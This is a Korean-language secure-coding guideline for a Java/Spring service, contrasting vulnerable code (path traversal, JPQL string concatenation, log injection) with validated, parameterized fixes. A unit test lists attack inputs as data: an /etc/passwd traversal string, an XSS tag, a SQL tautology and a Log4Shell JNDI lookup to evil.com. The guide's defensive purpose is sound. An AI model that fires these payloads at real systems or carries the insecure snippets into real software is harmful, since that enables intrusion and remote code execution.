---
id: GR-SEC-003
category: security
severity: critical
keywords: [Injection, PathTraversal, XSS, SQLi, CRLF, Validation]
---

# Input Validation & Sanitization

## DON'T (안티패턴)

### 1. Path Variable 검증 없음 (Path Traversal)
```java
// Bad (Path Traversal 취약)
@GetMapping("/files/{path}")
public ResponseEntity<?> getFile(@PathVariable String path) {
    return ResponseEntity.ok(Files.read(Paths.get(path)));
}
```

### 2. 문자열 연결로 SQL 쿼리 작성 (SQL Injection)
```java
// Bad (JPQL Injection)
@Query("SELECT c FROM Character c WHERE c.ign = '" + ign + "'")
List<Character> findByIgn(String ign);
```

### 3. 사용자 입력을 직접 로깅 (Log Injection)
```java
// Bad (CRLF Injection)
log.info("User input: " + userInput);  // \n\n\n 으로 로그 조작 가능
```

### 4. 정규식 없는 문자열 검증
```java
// Bad (모든 입력 허용)
@GetMapping("/characters/{ign}")
public ResponseEntity<?> getCharacter(@PathVariable String ign) {
    return ResponseEntity.ok(service.findByIgn(ign));
}
```

## DO (베스트 프랙티스)

### 1. Path Variable 정규식 검증
```java
// Good (정규식 검증)
@GetMapping("/characters/{ign}")
public ResponseEntity<?> getCharacter(
    @PathVariable @Pattern(regexp = "^[a-zA-Z0-9가-힣]{1,12}$") String ign) {
    return ResponseEntity.ok(service.findByIgn(ign));
}
```

### 2. Parameterized Query (SQL Injection 방지)
```java
// Good (JPA Parameterized Query)
@Query("SELECT c FROM Character c WHERE c.ign = :ign")
Optional<Character> findByIgn(@Param("ign") String ign);

// Good (JPA Criteria Builder)
CriteriaBuilder cb = entityManager.getCriteriaBuilder();
CriteriaQuery<Character> query = cb.createQuery(Character.class);
Root<Character> root = query.from(Character.class);
query.where(cb.equal(root.get("ign"), ign));
```

### 3. SLF4J 자동 이스케이프 (Log Injection 방지)
```java
// Good (자동 이스케이프)
log.info("User input: {}", userInput);  // SLF4J가 자동 처리

// 수동 이스케이프 (필요 시)
String sanitized = userInput.replace("\n", "\\n").replace("\r", "\\r");
log.info("User input: {}", sanitized);
```

### 4. 다층 입력 검증 (Defense in Depth)

| 계층 | 검증 방법 | 예시 |
|------|----------|------|
| **Controller** | @Pattern, @Size, @Valid | `@Pattern(regexp="^[a-zA-Z0-9]{1,12}$")` |
| **Service** | 비즈니스 규칙 검증 | 금칙어, 길이, 형식 |
| **Repository** | Parameterized Query | `:param` 바인딩 |

### 5. 공격 패턴 차단
```java
@ParameterizedTest
@ValueSource(strings = {
    "../../../etc/passwd",           // Path Traversal
    "<script>alert('xss')</script>", // XSS
    "' OR '1'='1",                   // SQL Injection
    "${jndi:ldap://evil.com/a}",    // Log4Shell
    "\u0000 malicious"               // Null Byte Injection
})
@DisplayName("공격 패턴 차단")
void getCharacter_withMaliciousInput_rejected(String maliciousInput) {
    assertThatThrownBy(() -> service.findByIgn(maliciousInput))
        .isInstanceOf(InvalidInputException.class);
}
```

## Anti-Patterns Summary

| Anti-Pattern | OWASP Category | Impact |
|--------------|----------------|--------|
| **Path Traversal** | A01:2021 | 파일 시스템 접근 |
| **SQL Injection** | A03:2021 | 데이터베이스 탈취 |
| **XSS** | A03:2021 | 스크립트 주입 |
| **Log Injection** | A09:2021 | 로그 변조/위장 |
| **Command Injection** | A03:2021 | RCE |

## OWASP Top 10 (2021) Coverage

### A01: Broken Access Control
```java
// IDOR 방지
@GetMapping("/users/{id}")
public ResponseEntity<?> getUser(@PathVariable Long id) {
    User user = service.findById(id);
    if (!currentUser.equals(user)) {  // 소유권 검증
        throw new ForbiddenException();
    }
    return ResponseEntity.ok(user);
}
```

### A03: Injection
```java
// SQL Injection 방지
@Query("SELECT c FROM Character c WHERE c.ign = :ign AND c.worldName = :world")
List<Character> findByIgnAndWorld(@Param("ign") String ign, @Param("world") String world);
```

### A05: Security Misconfiguration
```java
// 기본 비밀번호/설정 방지
@ConfigurationProperties(prefix = "app.admin")
public class AdminProperties {
    @NotBlank
    private String defaultPassword;  // 반드시 설정 필요
}
```

## Verification Commands

```bash
# 1. Path Traversal 취약점 검색
grep -r "@PathVariable.*String path" src/main/java/ | grep -v "@Pattern"

# 2. SQL Injection 패턴 검색
grep -r "Query.*\+.*'" src/main/java/

# 3. 직접 문자열 연결 로깅
grep -r "log.info.*+" src/main/java/ | grep -v "{}"

# 4. 정규식 검증 확인
grep -r "@Pattern" src/main/java/
```

## 출처
- [docs/03_Technical_Guides/security-hardening.md](../../../03_Technical_Guides/security-hardening.md) Section 30
- [docs/03_Technical_Guides/security-checklist.md](../../../03_Technical_Guides/security-checklist.md) Section 2
